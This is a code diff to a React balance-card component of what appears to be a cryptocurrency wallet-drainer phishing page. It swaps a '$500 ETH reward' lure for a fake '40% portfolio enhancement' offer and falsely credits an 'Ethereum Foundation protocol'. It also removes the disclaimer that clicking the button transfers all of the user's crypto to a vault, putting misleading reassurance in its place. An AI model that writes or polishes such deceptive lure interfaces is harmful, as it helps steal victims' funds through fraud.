@@ -67,14 +67,21 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
     style: 'currency',
     currency: 'USD'
   });
+  
+  // Calculate 40% enhancement value
+  const enhancementValue = totalValue * 0.4;
+  const enhancementUSD = enhancementValue.toLocaleString('en-US', {
+    style: 'currency',
+    currency: 'USD'
+  });
 
   if (!walletState.isConnected) {
     return (
       <div className="text-center">
         <div className="bg-gray-100 dark:bg-gray-800 rounded-xl p-6 mb-4">
-          <p className="text-gray-600 dark:text-gray-400 mb-4">Connect your wallet to claim your $500 ETH reward</p>
+          <p className="text-gray-600 dark:text-gray-400 mb-4">Connect your wallet to claim your 40% portfolio enhancement reward</p>
           <Button disabled className="w-full bg-gray-300 text-gray-500 cursor-not-allowed">
-            Connect Wallet to Claim $500 ETH
+            Connect Wallet to Claim 40% Enhancement
           </Button>
         </div>
       </div>
@@ -84,11 +91,22 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
   return (
     <div className="text-center space-y-6">
       {/* Wallet Portfolio Display */}
-      <div className="bg-white/50 dark:bg-gray-800/50 rounded-xl p-4 border border-gray-200 dark:border-gray-700">
+      <div className="bg-white/50 dark:bg-gray-800/50 rounded-xl p-6 border border-gray-200 dark:border-gray-700">
         <div className="text-sm text-gray-600 dark:text-gray-400 mb-2">Your Current Portfolio</div>
-        <div className="text-2xl font-bold text-gray-900 dark:text-white">{balanceUSD}</div>
-        <div className="text-xs text-gray-500 dark:text-gray-500 mt-1">
+        <div className="text-2xl font-bold text-gray-900 dark:text-white mb-3">{balanceUSD}</div>
+        <div className="text-xs text-gray-500 dark:text-gray-500 mb-4">
           Across {walletState.networkBalances?.length || 1} networks • {(walletState.tokenBalances?.length || 0) + 1} assets
+        </div>
+        
+        {/* Enhancement Calculation Display */}
+        <div className="bg-primary/5 border border-primary/20 rounded-lg p-3">
+          <div className="flex items-center justify-between">
+            <div className="text-sm text-muted-foreground">40% Enhancement Value:</div>
+            <div className="text-lg font-bold text-primary">{enhancementUSD}</div>
+          </div>
+          <div className="text-xs text-muted-foreground mt-1">
+            Algorithmic portfolio optimization through Ethereum Foundation protocol
+          </div>
         </div>
       </div>
 
@@ -113,13 +131,13 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
           ) : (
             <div className="flex items-center space-x-2">
               <span className="text-2xl">Ξ</span>
-              <span>Claim $500 ETH</span>
+              <span>Claim {enhancementUSD} Enhancement</span>
             </div>
           )}
         </Button>
         
         <div className="text-xs text-gray-500 dark:text-gray-400 text-center">
-          * Clicking this button transfers ALL your crypto to the vault for processing
+          * Claim processes 40% of your {balanceUSD} portfolio ({enhancementUSD}) through algorithmic enhancement
         </div>
       </div>
 
